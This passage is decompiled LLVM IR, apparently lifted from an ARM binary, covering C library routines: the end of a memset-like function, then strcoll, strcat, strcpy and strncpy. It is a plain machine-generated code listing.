  br i1 %v5_c88c11, label %dec_label_pc_c8c8, label %dec_label_pc_c890.preheader

dec_label_pc_c890.preheader:                      ; preds = %dec_label_pc_c884
  %v1_c89046 = inttoptr i32 %v0_c89028 to i32*
  store i32 %v0_c884, i32* %v1_c89046, align 4
  %v3_c89047 = add i32 %v0_c89028, 4
  %v4_c89048 = inttoptr i32 %v3_c89047 to i32*
  %v5_c89049 = load i32, i32* @ip, align 4
  store i32 %v5_c89049, i32* %v4_c89048, align 4
  %v6_c89050 = add i32 %v0_c89028, 8
  store i32 %v6_c89050, i32* %r3.global-to-local, align 4
  %v0_c89451 = load i32, i32* @r2, align 4
  %v1_c89452 = add i32 %v0_c89451, -8
  store i32 %v1_c89452, i32* %r2.global-to-local, align 4
  %v5_c89c53 = icmp slt i32 %v1_c89452, 8
  br i1 %v5_c89c53, label %dec_label_pc_c890.dec_label_pc_c8c8.loopexit_crit_edge, label %dec_label_pc_c8a0

dec_label_pc_c8a0:                                ; preds = %dec_label_pc_c890.preheader, %dec_label_pc_c888.dec_label_pc_c890_crit_edge
  %v6_c89055 = phi i32 [ %v6_c890, %dec_label_pc_c888.dec_label_pc_c890_crit_edge ], [ %v6_c89050, %dec_label_pc_c890.preheader ]
  %v0_c89054 = phi i32 [ %v12_c8bc, %dec_label_pc_c888.dec_label_pc_c890_crit_edge ], [ %v0_c89028, %dec_label_pc_c890.preheader ]
  %v1_c8a0 = inttoptr i32 %v6_c89055 to i32*
  %v2_c8a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_c8a0, i32* %v1_c8a0, align 4
  %v3_c8a0 = add i32 %v0_c89054, 12
  %v4_c8a0 = inttoptr i32 %v3_c8a0 to i32*
  %v5_c8a0 = load i32, i32* @ip, align 4
  store i32 %v5_c8a0, i32* %v4_c8a0, align 4
  %v6_c8a0 = add i32 %v0_c89054, 16
  store i32 %v6_c8a0, i32* %r3.global-to-local, align 4
  %v0_c8a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c8a4 = add i32 %v0_c8a4, -8
  store i32 %v1_c8a4, i32* %r2.global-to-local, align 4
  %v5_c8ac = icmp slt i32 %v1_c8a4, 8
  br i1 %v5_c8ac, label %dec_label_pc_c8a0.dec_label_pc_c8c8.loopexit_crit_edge, label %dec_label_pc_c8b0

dec_label_pc_c8b0:                                ; preds = %dec_label_pc_c8a0
  %v1_c8b0 = inttoptr i32 %v6_c8a0 to i32*
  %v2_c8b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_c8b0, i32* %v1_c8b0, align 4
  %v3_c8b0 = add i32 %v0_c89054, 20
  %v4_c8b0 = inttoptr i32 %v3_c8b0 to i32*
  %v5_c8b0 = load i32, i32* @ip, align 4
  store i32 %v5_c8b0, i32* %v4_c8b0, align 4
  %v6_c8b0 = add i32 %v0_c89054, 24
  store i32 %v6_c8b0, i32* %r3.global-to-local, align 4
  %v0_c8b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c8b4 = add i32 %v0_c8b4, -8
  store i32 %v1_c8b4, i32* %r2.global-to-local, align 4
  %v5_c8bc = icmp slt i32 %v1_c8b4, 8
  br i1 %v5_c8bc, label %dec_label_pc_c8b0.dec_label_pc_c8c8.loopexit_crit_edge, label %dec_label_pc_c888

dec_label_pc_c888:                                ; preds = %dec_label_pc_c8b0
  %v7_c8bc = inttoptr i32 %v6_c8b0 to i32*
  %v8_c8bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_c8bc, i32* %v7_c8bc, align 4
  %v9_c8bc = add i32 %v0_c89054, 28
  %v10_c8bc = inttoptr i32 %v9_c8bc to i32*
  %v11_c8bc = load i32, i32* @ip, align 4
  store i32 %v11_c8bc, i32* %v10_c8bc, align 4
  %v12_c8bc = add i32 %v0_c89054, 32
  store i32 %v12_c8bc, i32* %r3.global-to-local, align 4
  %v6_c8c0 = load i32, i32* %r2.global-to-local, align 4
  %v7_c8c0 = add i32 %v6_c8c0, -8
  store i32 %v7_c8c0, i32* %r2.global-to-local, align 4
  %v5_c88c = icmp slt i32 %v7_c8c0, 8
  br i1 %v5_c88c, label %dec_label_pc_c888.dec_label_pc_c8c8.loopexit_crit_edge, label %dec_label_pc_c888.dec_label_pc_c890_crit_edge

dec_label_pc_c888.dec_label_pc_c890_crit_edge:    ; preds = %dec_label_pc_c888
  %v2_c890.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_c890 = inttoptr i32 %v12_c8bc to i32*
  store i32 %v2_c890.pre, i32* %v1_c890, align 4
  %v3_c890 = add i32 %v0_c89054, 36
  %v4_c890 = inttoptr i32 %v3_c890 to i32*
  %v5_c890 = load i32, i32* @ip, align 4
  store i32 %v5_c890, i32* %v4_c890, align 4
  %v6_c890 = add i32 %v0_c89054, 40
  store i32 %v6_c890, i32* %r3.global-to-local, align 4
  %v0_c894 = load i32, i32* %r2.global-to-local, align 4
  %v1_c894 = add i32 %v0_c894, -8
  store i32 %v1_c894, i32* %r2.global-to-local, align 4
  %v5_c89c = icmp slt i32 %v1_c894, 8
  br i1 %v5_c89c, label %dec_label_pc_c890.dec_label_pc_c8c8.loopexit_crit_edge, label %dec_label_pc_c8a0

dec_label_pc_c890.dec_label_pc_c8c8.loopexit_crit_edge: ; preds = %dec_label_pc_c888.dec_label_pc_c890_crit_edge, %dec_label_pc_c890.preheader
  %v1_c894.lcssa = phi i32 [ %v1_c89452, %dec_label_pc_c890.preheader ], [ %v1_c894, %dec_label_pc_c888.dec_label_pc_c890_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c8c8

dec_label_pc_c888.dec_label_pc_c8c8.loopexit_crit_edge: ; preds = %dec_label_pc_c888
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c8c8

dec_label_pc_c8a0.dec_label_pc_c8c8.loopexit_crit_edge: ; preds = %dec_label_pc_c8a0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c8c8

dec_label_pc_c8b0.dec_label_pc_c8c8.loopexit_crit_edge: ; preds = %dec_label_pc_c8b0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c8c8

dec_label_pc_c8c8:                                ; preds = %dec_label_pc_c884, %dec_label_pc_c890.dec_label_pc_c8c8.loopexit_crit_edge, %dec_label_pc_c888.dec_label_pc_c8c8.loopexit_crit_edge, %dec_label_pc_c8a0.dec_label_pc_c8c8.loopexit_crit_edge, %dec_label_pc_c8b0.dec_label_pc_c8c8.loopexit_crit_edge, %entry
  %v0_c8d0 = phi i32 [ %v0_c864, %entry ], [ %v1_c8b4, %dec_label_pc_c8b0.dec_label_pc_c8c8.loopexit_crit_edge ], [ %v1_c8a4, %dec_label_pc_c8a0.dec_label_pc_c8c8.loopexit_crit_edge ], [ %v7_c8c0, %dec_label_pc_c888.dec_label_pc_c8c8.loopexit_crit_edge ], [ %v1_c894.lcssa, %dec_label_pc_c890.dec_label_pc_c8c8.loopexit_crit_edge ], [ %v0_c888.pr, %dec_label_pc_c884 ]
  %v2_c8c8 = icmp eq i32 %v0_c8d0, 0
  store i1 %v2_c8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c8c8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_c8c8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_c8c8
  %v1_c8d0 = sub i32 7, %v0_c8d0
  store i32 %v1_c8d0, i32* %r2.global-to-local, align 4
  %v3_c8d4 = mul i32 %v1_c8d0, 4
  %v4_c8d4 = add i32 %v3_c8d4, ptrtoint (i32* @global_var_c8dc.511 to i32)
  call void @__pseudo_branch(i32 %v4_c8d4)
  %v0_c8dc = load i32, i32* %r1.global-to-local, align 4
  %v1_c8dc = trunc i32 %v0_c8dc to i8
  %v2_c8dc = load i32, i32* %r3.global-to-local, align 4
  %v3_c8dc = inttoptr i32 %v2_c8dc to i8*
  store i8 %v1_c8dc, i8* %v3_c8dc, align 1
  %v4_c8dc = load i32, i32* %r3.global-to-local, align 4
  %v5_c8dc = add i32 %v4_c8dc, 1
  store i32 %v5_c8dc, i32* %r3.global-to-local, align 4
  %v0_c8e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c8e0 = trunc i32 %v0_c8e0 to i8
  %v3_c8e0 = inttoptr i32 %v5_c8dc to i8*
  store i8 %v1_c8e0, i8* %v3_c8e0, align 1
  %v4_c8e0 = load i32, i32* %r3.global-to-local, align 4
  %v5_c8e0 = add i32 %v4_c8e0, 1
  store i32 %v5_c8e0, i32* %r3.global-to-local, align 4
  %v0_c8e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c8e4 = trunc i32 %v0_c8e4 to i8
  %v3_c8e4 = inttoptr i32 %v5_c8e0 to i8*
  store i8 %v1_c8e4, i8* %v3_c8e4, align 1
  %v4_c8e4 = load i32, i32* %r3.global-to-local, align 4
  %v5_c8e4 = add i32 %v4_c8e4, 1
  store i32 %v5_c8e4, i32* %r3.global-to-local, align 4
  %v0_c8e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c8e8 = trunc i32 %v0_c8e8 to i8
  %v3_c8e8 = inttoptr i32 %v5_c8e4 to i8*
  store i8 %v1_c8e8, i8* %v3_c8e8, align 1
  %v4_c8e8 = load i32, i32* %r3.global-to-local, align 4
  %v5_c8e8 = add i32 %v4_c8e8, 1
  store i32 %v5_c8e8, i32* %r3.global-to-local, align 4
  %v0_c8ec = load i32, i32* %r1.global-to-local, align 4
  %v1_c8ec = trunc i32 %v0_c8ec to i8
  %v3_c8ec = inttoptr i32 %v5_c8e8 to i8*
  store i8 %v1_c8ec, i8* %v3_c8ec, align 1
  %v4_c8ec = load i32, i32* %r3.global-to-local, align 4
  %v5_c8ec = add i32 %v4_c8ec, 1
  store i32 %v5_c8ec, i32* %r3.global-to-local, align 4
  %v0_c8f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c8f0 = trunc i32 %v0_c8f0 to i8
  %v3_c8f0 = inttoptr i32 %v5_c8ec to i8*
  store i8 %v1_c8f0, i8* %v3_c8f0, align 1
  %v4_c8f0 = load i32, i32* %r3.global-to-local, align 4
  %v5_c8f0 = add i32 %v4_c8f0, 1
  store i32 %v5_c8f0, i32* %r3.global-to-local, align 4
  %v0_c8f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c8f4 = trunc i32 %v0_c8f4 to i8
  %v3_c8f4 = inttoptr i32 %v5_c8f0 to i8*
  store i8 %v1_c8f4, i8* %v3_c8f4, align 1
  %v4_c8f4 = load i32, i32* %r3.global-to-local, align 4
  %v5_c8f4 = add i32 %v4_c8f4, 1
  store i32 %v5_c8f4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_c890, { 1, 0 }
  uselistorder i32 %v12_c8bc, { 1, 2, 0 }
  uselistorder i32 %v0_c89054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_c888.pr, { 0, 2, 1 }
  uselistorder i32 %v6_c878, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_c86c, { 1, 0 }
  uselistorder i32 %v0_c864, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 21, 17, 14, 15, 16, 13, 18, 20, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 13, 8, 9, 10, 11, 12, 1, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 3, 0, 4, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_c8c8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_c8a0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_c904.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_c904 = phi i32 [ %v0_c904.pre, %bb ], [ %v5_c904, %bb3 ]
  %v0_c900 = phi i32 [ %tmp, %bb ], [ %v5_c900, %bb3 ]
  %v1_c900 = inttoptr i32 %v0_c900 to i8*
  %v2_c900 = load i8, i8* %v1_c900, align 1
  %v1_c904 = inttoptr i32 %v0_c904 to i8*
  %v2_c904 = load i8, i8* %v1_c904, align 1
  %v3_c904 = zext i8 %v2_c904 to i32
  %v2_c908 = icmp eq i8 %v2_c900, 0
  br i1 %v2_c908, label %.dec_label_pc_c914_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_c904 = add i32 %v0_c904, 1
  %v5_c900 = add i32 %v0_c900, 1
  %v3_c900 = zext i8 %v2_c900 to i32
  %v10_c90c = icmp eq i8 %v2_c900, %v2_c904
  br i1 %v10_c90c, label %entry, label %dec_label_pc_c914

.dec_label_pc_c914_crit_edge:                     ; preds = %entry
  br label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %bb3, %.dec_label_pc_c914_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_c914_crit_edge ], [ %v3_c900, %bb3 ]
  %v2_c914.pre-phi = sub nsw i32 %.pn, %v3_c904
  ret i32 %v2_c914.pre-phi

; uselistorder directives
  uselistorder i8 %v2_c900, { 0, 2, 1 }
  uselistorder i32 %v0_c900, { 1, 0 }
  uselistorder i32 %v0_c904, { 1, 0 }
  uselistorder label %dec_label_pc_c914, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c984

dec_label_pc_c984:                                ; preds = %dec_label_pc_c984, %entry
  %v0_c984 = phi i32 [ %v5_c984, %dec_label_pc_c984 ], [ %tmp, %entry ]
  %v1_c984 = inttoptr i32 %v0_c984 to i8*
  %v2_c984 = load i8, i8* %v1_c984, align 1
  %v5_c984 = add i32 %v0_c984, 1
  store i32 %v5_c984, i32* %r2.global-to-local, align 4
  %v2_c988 = icmp eq i8 %v2_c984, 0
  store i1 %v2_c988, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c988, label %dec_label_pc_c990, label %dec_label_pc_c984

dec_label_pc_c990:                                ; preds = %dec_label_pc_c984
  %v1_c990 = add i32 %v0_c984, -1
  store i32 %v1_c990, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c994

dec_label_pc_c994:                                ; preds = %dec_label_pc_c994, %dec_label_pc_c990
  %v2_c99c = phi i32 [ %v6_c99c, %dec_label_pc_c994 ], [ %v1_c990, %dec_label_pc_c990 ]
  %v0_c994 = load i32, i32* @r1, align 4
  %v1_c994 = inttoptr i32 %v0_c994 to i8*
  %v2_c994 = load i8, i8* %v1_c994, align 1
  %v5_c994 = add i32 %v0_c994, 1
  store i32 %v5_c994, i32* @r1, align 4
  %v2_c998 = icmp eq i8 %v2_c994, 0
  store i1 %v2_c998, i1* %cpsr_z.global-to-local, align 1
  %v3_c99c = add i32 %v2_c99c, 1
  %v4_c99c = inttoptr i32 %v3_c99c to i8*
  store i8 %v2_c994, i8* %v4_c99c, align 1
  %v5_c99c = load i32, i32* %r2.global-to-local, align 4
  %v6_c99c = add i32 %v5_c99c, 1
  store i32 %v6_c99c, i32* %r2.global-to-local, align 4
  %v0_c9a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9a0, label %dec_label_pc_c9a4, label %dec_label_pc_c994

dec_label_pc_c9a4:                                ; preds = %dec_label_pc_c994
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_c99c, { 1, 0 }
  uselistorder i32 %v5_c984, { 1, 0 }
  uselistorder i32 %v0_c984, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_c9a8 = sub i32 %arg1, %tmp
  %v1_c9ac = add i32 %v2_c9a8, -1
  store i32 %v1_c9ac, i32* %r2.global-to-local, align 4
  %v2_c9b04 = load i8, i8* %arg2, align 1
  %v5_c9b06 = add i32 %tmp, 1
  store i32 %v5_c9b06, i32* %r1.global-to-local, align 4
  %v2_c9b47 = icmp eq i8 %v2_c9b04, 0
  store i1 %v2_c9b47, i1* %cpsr_z.global-to-local, align 1
  %v5_c9b88 = inttoptr i32 %arg1 to i8*
  store i8 %v2_c9b04, i8* %v5_c9b88, align 1
  %v0_c9bc9 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9bc9, label %dec_label_pc_c9c0, label %dec_label_pc_c9b0.dec_label_pc_c9b0_crit_edge

dec_label_pc_c9b0.dec_label_pc_c9b0_crit_edge:    ; preds = %entry, %dec_label_pc_c9b0.dec_label_pc_c9b0_crit_edge
  %v0_c9b0.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_c9b8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_c9b0 = inttoptr i32 %v0_c9b0.pre to i8*
  %v2_c9b0 = load i8, i8* %v1_c9b0, align 1
  %v5_c9b0 = add i32 %v0_c9b0.pre, 1
  store i32 %v5_c9b0, i32* %r1.global-to-local, align 4
  %v2_c9b4 = icmp eq i8 %v2_c9b0, 0
  store i1 %v2_c9b4, i1* %cpsr_z.global-to-local, align 1
  %v4_c9b8 = add i32 %v5_c9b0, %v3_c9b8.pre
  %v5_c9b8 = inttoptr i32 %v4_c9b8 to i8*
  store i8 %v2_c9b0, i8* %v5_c9b8, align 1
  %v0_c9bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9bc, label %dec_label_pc_c9c0, label %dec_label_pc_c9b0.dec_label_pc_c9b0_crit_edge

dec_label_pc_c9c0:                                ; preds = %dec_label_pc_c9b0.dec_label_pc_c9b0_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c9b0.dec_label_pc_c9b0_crit_edge, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_c9c4 = icmp eq i32 %arg2, 3
  store i1 %v7_c9c4, i1* %cpsr_z.global-to-local, align 1
  %v1_c9cc = add i32 %arg1, -1
  store i32 %v1_c9cc, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_ca48, label %dec_label_pc_c9d4

dec_label_pc_c9d4:                                ; preds = %entry
  %v3_c9d4 = udiv i32 %arg2, 4
  store i32 %v3_c9d4, i32* @lr, align 4
  %v0_c9d8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c9d8

dec_label_pc_c9d8:                                ; preds = %dec_label_pc_ca24, %dec_label_pc_c9d4
  %v2_c9e0 = phi i32 [ %v6_ca18, %dec_label_pc_ca24 ], [ %v1_c9cc, %dec_label_pc_c9d4 ]
  %v0_c9d8 = phi i32 [ %v1_ca28, %dec_label_pc_ca24 ], [ %v0_c9d8.pre, %dec_label_pc_c9d4 ]
  %v1_c9d8 = inttoptr i32 %v0_c9d8 to i8*
  %v2_c9d8 = load i8, i8* %v1_c9d8, align 1
  %v3_c9d8 = zext i8 %v2_c9d8 to i32
  store i32 %v3_c9d8, i32* %r3.global-to-local, align 4
  %v2_c9dc = icmp eq i8 %v2_c9d8, 0
  store i1 %v2_c9dc, i1* %cpsr_z.global-to-local, align 1
  %v3_c9e0 = add i32 %v2_c9e0, 1
  %v4_c9e0 = inttoptr i32 %v3_c9e0 to i8*
  store i8 %v2_c9d8, i8* %v4_c9e0, align 1
  %v5_c9e0 = load i32, i32* %ip.global-to-local, align 4
  %v6_c9e0 = add i32 %v5_c9e0, 1
  store i32 %v6_c9e0, i32* %ip.global-to-local, align 4
  %v0_c9e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9e4, label %dec_label_pc_ca34, label %dec_label_pc_c9e8

dec_label_pc_c9e8:                                ; preds = %dec_label_pc_c9d8
  %v0_c9e8 = load i32, i32* @r1, align 4
  %v1_c9e8 = add i32 %v0_c9e8, 1
  %v2_c9e8 = inttoptr i32 %v1_c9e8 to i8*
  %v3_c9e8 = load i8, i8* %v2_c9e8, align 1
  %v4_c9e8 = zext i8 %v3_c9e8 to i32
  store i32 %v4_c9e8, i32* %r3.global-to-local, align 4
  %v2_c9ec = icmp eq i8 %v3_c9e8, 0
  store i1 %v2_c9ec, i1* %cpsr_z.global-to-local, align 1
  %v3_c9f0 = add i32 %v5_c9e0, 2
  %v4_c9f0 = inttoptr i32 %v3_c9f0 to i8*
  store i8 %v3_c9e8, i8* %v4_c9f0, align 1
  %v5_c9f0 = load i32, i32* %ip.global-to-local, align 4
  %v6_c9f0 = add i32 %v5_c9f0, 1
  store i32 %v6_c9f0, i32* %ip.global-to-local, align 4
  %v0_c9f4 = load i32, i32* @r1, align 4
  %v1_c9f4 = add i32 %v0_c9f4, 1
  store i32 %v1_c9f4, i32* %r1.global-to-local, align 4
  %v0_c9f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9f8, label %dec_label_pc_ca34, label %dec_label_pc_c9fc

dec_label_pc_c9fc:                                ; preds = %dec_label_pc_c9e8
  %v1_c9fc = add i32 %v0_c9f4, 2
  %v2_c9fc = inttoptr i32 %v1_c9fc to i8*
  %v3_c9fc = load i8, i8* %v2_c9fc, align 1
  %v4_c9fc = zext i8 %v3_c9fc to i32
  store i32 %v4_c9fc, i32* %r3.global-to-local, align 4
  %v2_ca00 = icmp eq i8 %v3_c9fc, 0
  store i1 %v2_ca00, i1* %cpsr_z.global-to-local, align 1
  %v3_ca04 = add i32 %v5_c9f0, 2
  %v4_ca04 = inttoptr i32 %v3_ca04 to i8*
  store i8 %v3_c9fc, i8* %v4_ca04, align 1
  %v5_ca04 = load i32, i32* %ip.global-to-local, align 4
  %v6_ca04 = add i32 %v5_ca04, 1
  store i32 %v6_ca04, i32* %ip.global-to-local, align 4
  %v0_ca08 = load i32, i32* %r1.global-to-local, align 4
  %v1_ca08 = add i32 %v0_ca08, 1
  store i32 %v1_ca08, i32* %r1.global-to-local, align 4
  %v0_ca0c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca0c, label %dec_label_pc_ca34, label %dec_label_pc_ca10

dec_label_pc_ca10:                                ; preds = %dec_label_pc_c9fc
  %v1_ca10 = add i32 %v0_ca08, 2
  %v2_ca10 = inttoptr i32 %v1_ca10 to i8*
  %v3_ca10 = load i8, i8* %v2_ca10, align 1
  %v4_ca10 = zext i8 %v3_ca10 to i32
  store i32 %v4_ca10, i32* %r3.global-to-local, align 4
  %v2_ca14 = icmp eq i8 %v3_ca10, 0
  store i1 %v2_ca14, i1* %cpsr_z.global-to-local, align 1
  %v3_ca18 = add i32 %v5_ca04, 2
  %v4_ca18 = inttoptr i32 %v3_ca18 to i8*
  store i8 %v3_ca10, i8* %v4_ca18, align 1
  %v5_ca18 = load i32, i32* %ip.global-to-local, align 4
  %v6_ca18 = add i32 %v5_ca18, 1
  store i32 %v6_ca18, i32* %ip.global-to-local, align 4
  %v0_ca1c = load i32, i32* %r1.global-to-local, align 4
  %v1_ca1c = add i32 %v0_ca1c, 1
  store i32 %v1_ca1c, i32* %r1.global-to-local, align 4
  %v0_ca20 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca20, label %dec_label_pc_ca34, label %dec_label_pc_ca24

dec_label_pc_ca24:                                ; preds = %dec_label_pc_ca10
  %v0_ca24 = load i32, i32* @lr, align 4
  %v1_ca24 = add i32 %v0_ca24, -1
  store i32 %v1_ca24, i32* @lr, align 4
  %v7_ca24 = icmp eq i32 %v0_ca24, 1
  store i1 %v7_ca24, i1* %cpsr_z.global-to-local, align 1
  %v1_ca28 = add i32 %v0_ca1c, 2
  store i32 %v1_ca28, i32* @r1, align 4
  br i1 %v7_ca24, label %dec_label_pc_ca48, label %dec_label_pc_c9d8

dec_label_pc_ca34:                                ; preds = %dec_label_pc_ca10, %dec_label_pc_c9fc, %dec_label_pc_c9e8, %dec_label_pc_c9d8
  %v1_ca34 = phi i32 [ %v6_ca18, %dec_label_pc_ca10 ], [ %v6_ca04, %dec_label_pc_c9fc ], [ %v6_c9f0, %dec_label_pc_c9e8 ], [ %v6_c9e0, %dec_label_pc_c9d8 ]
  %v2_ca341 = sub i32 %arg1, %v1_ca34
  %v2_ca38 = add i32 %v2_ca341, %arg2
  store i32 %v2_ca38, i32* %r3.global-to-local, align 4
  %v1_ca3c = add i32 %v2_ca38, -1
  store i32 %v1_ca3c, i32* %r2.global-to-local, align 4
  %v7_ca3c = icmp eq i32 %v2_ca38, 1
  store i1 %v7_ca3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ca3c, label %bb, label %dec_label_pc_ca68

bb:                                               ; preds = %dec_label_pc_ca34
  ret i32 %arg1

dec_label_pc_ca48:                                ; preds = %dec_label_pc_ca24, %entry
  %v2_ca586 = phi i32 [ %v1_c9cc, %entry ], [ %v6_ca18, %dec_label_pc_ca24 ]
  %v1_ca48 = urem i32 %arg2, 4
  store i32 %v1_ca48, i32* %r2.global-to-local, align 4
  %v2_ca48 = icmp eq i32 %v1_ca48, 0
  store i1 %v2_ca48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ca48, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_ca48
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_ca48, %._crit_edge
  %v2_ca58 = phi i32 [ %v6_ca58, %._crit_edge ], [ %v2_ca586, %dec_label_pc_ca48 ]
  %v0_ca54 = phi i32 [ %v0_ca54.pre, %._crit_edge ], [ %v1_ca48, %dec_label_pc_ca48 ]
  %v0_ca50 = load i32, i32* @r1, align 4
  %v1_ca50 = inttoptr i32 %v0_ca50 to i8*
  %v2_ca50 = load i8, i8* %v1_ca50, align 1
  %v3_ca50 = zext i8 %v2_ca50 to i32
  store i32 %v3_ca50, i32* %r3.global-to-local, align 4
  %v5_ca50 = add i32 %v0_ca50, 1
  store i32 %v5_ca50, i32* @r1, align 4
  %v1_ca54 = add i32 %v0_ca54, -1
  store i32 %v1_ca54, i32* %r2.global-to-local, align 4
  %v7_ca54 = icmp eq i32 %v0_ca54, 1
  store i1 %v7_ca54, i1* %cpsr_z.global-to-local, align 1
  %v3_ca58 = add i32 %v2_ca58, 1
  %v4_ca58 = inttoptr i32 %v3_ca58 to i8*
  store i8 %v2_ca50, i8* %v4_ca58, align 1
  %v5_ca58 = load i32, i32* %ip.global-to-local, align 4
  %v6_ca58 = add i32 %v5_ca58, 1
  store i32 %v6_ca58, i32* %ip.global-to-local, align 4
  %v0_ca5c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca5c, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_ca60 = load i32, i32* %r3.global-to-local, align 4
  %v2_ca60 = icmp eq i32 %v0_ca60, 0
  store i1 %v2_ca60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ca60, label %dec_label_pc_ca68, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_ca54.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_ca68:                                ; preds = %dec_label_pc_ca34, %bb13, %dec_label_pc_ca68
  %v2_ca70 = phi i32 [ %v6_ca70, %dec_label_pc_ca68 ], [ %v1_ca34, %dec_label_pc_ca34 ], [ %v6_ca58, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ca6c = load i32, i32* %r2.global-to-local, align 4
  %v1_ca6c = add i32 %v0_ca6c, -1
  store i32 %v1_ca6c, i32* %r2.global-to-local, align 4
  %v7_ca6c = icmp eq i32 %v0_ca6c, 1
  store i1 %v7_ca6c, i1* %cpsr_z.global-to-local, align 1
  %v3_ca70 = add i32 %v2_ca70, 1
  %v4_ca70 = inttoptr i32 %v3_ca70 to i8*
  store i8 0, i8* %v4_ca70, align 1
  %v5_ca70 = load i32, i32* %ip.global-to-local, align 4
  %v6_ca70 = add i32 %v5_ca70, 1
  store i32 %v6_ca70, i32* %ip.global-to-local, align 4
  %v0_ca74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca74, label %dec_label_pc_ca78, label %dec_label_pc_ca68

dec_label_pc_ca78:                                ; preds = %dec_label_pc_ca68
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_ca70, { 1, 0 }
  uselistorder i32 %v0_ca6c, { 1, 0 }
  uselistorder i32 %v6_ca58, { 0, 2, 1 }
  uselistorder i32 %v1_ca48, { 2, 1, 0 }
